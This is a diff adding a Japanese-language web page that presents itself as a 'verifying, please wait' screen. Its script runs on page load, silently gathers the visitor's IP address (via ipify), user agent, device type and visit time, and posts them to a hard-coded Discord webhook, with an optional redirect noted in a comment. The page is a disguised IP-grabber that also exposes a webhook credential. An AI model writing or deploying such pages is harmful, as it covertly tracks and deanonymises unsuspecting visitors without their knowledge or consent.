@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>確認中...</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: system-ui, sans-serif;
+      background: #ffffff;
+      color: #111111;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      width: 100%;
+      max-width: 380px;
+      padding: 32px 24px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+    p {
+      font-size: 15px;
+      color: #555;
+      line-height: 1.5;
+    }
+    #status {
+      margin-top: 28px;
+      font-size: 15px;
+      color: #0066ff;
+      min-height: 24px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>確認中です...</h1>
+    <p>しばらくお待ちください。</p>
+    <div id="status">情報を取得しています...</div>
+  </div>
+
+  <script>
+    const status = document.getElementById('status');
+
+    async function collectAndSend() {
+      let ip = "取得中...";
+
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ip = data.ip || "取得失敗";
+      } catch {
+        ip = "取得エラー";
+      }
+
+      const ua = navigator.userAgent;
+      const isMobile = /Mobi|Android|iPhone|iPad|iPod/.test(ua) ? "モバイル" : "PC/その他";
+
+      const payload = {
+        content: "**自動情報取得**",
+        embeds: [{
+          title: "訪問者情報（自動）",
+          color: 0x0066ff,
+          fields: [
+            { name: "IPアドレス", value: ip, inline: true },
+            { name: "デバイス", value: isMobile, inline: true },
+            { name: "User-Agent", value: ua.substring(0, 200) + (ua.length > 200 ? "..." : ""), inline: false },
+            { name: "アクセス時刻", value: new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' }), inline: false }
+          ],
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      const webhook = "https://discord.com/api/webhooks/1468964639743279248/YXgsTCbNoh2G5_Tkj8KXsZnmjQsK5WhCh1ZJY3qaV0upcfGjC_DU-0lPQwHxE8DoiLaf";
+
+      try {
+        const res = await fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok) {
+          status.textContent = "確認完了しました。";
+          // 必要ならここでリダイレクト（例: 本来の目的ページへ）
+          // setTimeout(() => { window.location.href = "https://example.com"; }, 1500);
+        } else {
+          status.textContent = "エラーが発生しました";
+          status.style.color = "red";
+        }
+      } catch (err) {
+        console.error(err);
+        status.textContent = "通信エラー";
+        status.style.color = "red";
+      }
+    }
+
+    // ページ読み込み直後に自動実行
+    collectAndSend();
+  </script>
+</body>
+</html>
